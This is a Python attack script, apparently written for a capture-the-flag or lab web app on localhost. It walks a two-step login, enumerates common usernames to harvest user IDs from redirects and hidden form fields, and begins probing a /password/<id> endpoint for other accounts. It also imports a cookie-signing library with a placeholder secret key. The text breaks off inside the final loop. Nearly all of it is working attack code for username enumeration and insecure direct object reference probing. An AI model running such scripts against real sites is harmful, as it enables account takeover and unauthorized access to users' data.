import base64
import requests
import json
from itsdangerous import URLSafeTimedSerializer

# Target information
base_url = "http://127.0.0.1:32948"
secret_key = "your_secret_key"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Login flow - complete the 2-step authentication
print("[+] Trying complete login flow...")

# Step 1: Login with username (test)
step1_data = {"username": "admin"}
resp_step1 = requests.post(base_url + "/", data=step1_data, headers=headers, allow_redirects=False)
print(f"Step 1 (username='admin'): {resp_step1.status_code}")
if resp_step1.status_code == 302:
    redirect_loc = resp_step1.headers.get('location', '')
    print(f"  Redirect to: {redirect_loc}")
    
    # Follow to password page
    resp_pw = requests.get(base_url + redirect_loc, headers=headers, allow_redirects=False)
    print(f"  Password page status: {resp_pw.status_code}")
    if resp_pw.status_code == 200:
        import re
        user_match = re.search(r'name="user_id"[^>]*value="([^"]+)"', resp_pw.text)
        if user_match:
            print(f"  User ID found: {user_match.group(1)}")
        print(f"  Page content:\n{resp_pw.text}")

# Try different usernames to find user_id=1
print("\n[+] Enumerating usernames to find admin user...")
usernames_to_try = ["admin", "root", "administrator", "sysadmin", "user", "john", "jane"]
for username in usernames_to_try:
    resp = requests.post(base_url + "/", data={"username": username}, headers=headers, allow_redirects=False)
    if resp.status_code == 302:
        loc = resp.headers.get('location', '')
        match = re.search(r'/password/([^/\s]+)', loc)
        if match:
            found_user = match.group(1)
            print(f"  Username '{username}' -> user_id: {found_user}")
            
            # Try accessing with this cookie
            resp_pw = requests.get(base_url + loc, headers=headers, allow_redirects=False)
            user_match = re.search(r'name="user_id"[^>]*value="([^"]+)"', resp_pw.text)
            if user_match:
                uid = user_match.group(1)
                print(f"    Form user_id field: {uid}")

# Check the /password/<username> endpoint for different users
print("\n[+] Testing /password/<username> endpoint with different user IDs...")
for uid in ["1", "2", "3", "100", "admin", "root"]:
    url = f"{base_url}/password/{uid}"
